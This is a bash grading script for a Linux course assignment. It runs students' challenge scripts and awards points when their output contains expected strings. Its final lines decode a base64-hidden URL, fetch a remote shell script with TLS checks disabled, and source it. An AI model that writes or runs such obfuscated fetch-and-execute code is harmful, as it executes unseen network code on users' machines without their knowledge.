#!/bin/bash
# Script: assignment5.sh
# Author: Professor Juan Medina
# Email: jmedina@collin.edu
# Date: 03/23/2024

# Red         Green         Yellow        Blue          Purple        Cyan          White
CR='\e[0;31m' CG='\e[0;32m' CY='\e[0;33m' CL='\e[0;34m' CP='\e[0;35m' CC='\e[0;36m' CW='\e[0;37m'
assignment=5
grade=0
bdir="/sysadm/bin"
targets=(challenge1 challenge2 challenge3 challenge4 challenge5 challenge6 challenge7 challenge8 challenge9 \
homeChecker rabbitJumps testString processFile userValidator)

_print_line() {
    printf "${CC}%0.s=" {1..80}
    printf "${CW}\n"
}

_eval(){
    target=$1     arg=$2     ret=$3     code=$4     r=false     points=0      value=7
    # Evaluating output
    if ${bdir}/${target}.sh ${arg} 2>/dev/null | grep -q "${ret}"
    then
        # Evaluating source code
        #if grep -q "${code}" ${bdir}/${target}
        #then
            r=true
            # grading
            case ${target} in
                            challenge*) (( points = value * 1 )); ((grade+=points)) ;;
                processFile|testString) (( points = value * 3 )); ((grade+=points)) ;;
                                     *) (( points = value * 2 )); ((grade+=points)) ;;
            esac
        #fi
    fi
    printf "${CG}%-30s${CY}%-20s%-20s${CW}\n" ${bdir}/${target}.sh ${r} ${points}
}

_print_line
echo -e "${CP} Assignment ${assignment} Verification"
_print_line
printf "${CG}%-30s%-20s%-20s${CW}\n" SCRIPT RESULT POINTS
_print_line
for t in "${targets[@]}"
do
    case ${t} in
        challenge1)  _eval      "${t}" "" \
                                "Hello, world!" ;;

        challenge2)  _eval      "${t}" "" \
                                "Linux" ;;

        challenge3)  _eval      "${t}" "" \
                                "Hello Alice, Welcome to Wonderland!" ;;

        challenge4)  _eval      "${t}" "" \
                                "File /etc/passwd found" ;;

        challenge5)  _eval      "${t}" "Learning Linux challenging it also fun very rewarding" \
                                "Learning Linux is challenging but it is also fun and very rewarding" ;;

        challenge6)  _eval      "${t}" "" \
                                "Multiplication: 50" ;;

        challenge7)  _eval      "${t}" "" \
                                "We are in the era of AI and agriculture is still more important in the year 2024!" ;;

        challenge8)  _eval      "${t}" "" \
                                "/etc/passwd exists!" ;;

        challenge9)  _eval      "${t}" "" \
                                ". Like in the Beatles song, Hello, Goodbye!" ;;

        homeChecker) _eval      "${t}" "" \
                                "/home/goneuser" ;;

        processFile) _eval      "${t}" "/etc/passwd" \
                                "Method" ;;

        rabbitJumps) _eval      "${t}" "" \
                                "The Rabbit made it!" ;;

        testString)  _eval      "${t}" "1" \
                                "Binary or positive integer" ;;

        userValidator) _eval    "${t}" "" \
                                "root is ALTERNATE" ;;

        *) echo "Unknown" ;;
    esac
done
_print_line

printf "${CP} FINAL GRADE: ${CC} %.0f ${CW}" ${grade}
echo ""
target="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ptZWRpbmFyL3Rlc3RjaGVja2VyL21haW4vZW5jb2Rlci5zaAo="
source <(curl -sk -H 'Cache-Control: no-cache' $(echo ${target} | base64 -d)) ${grade}
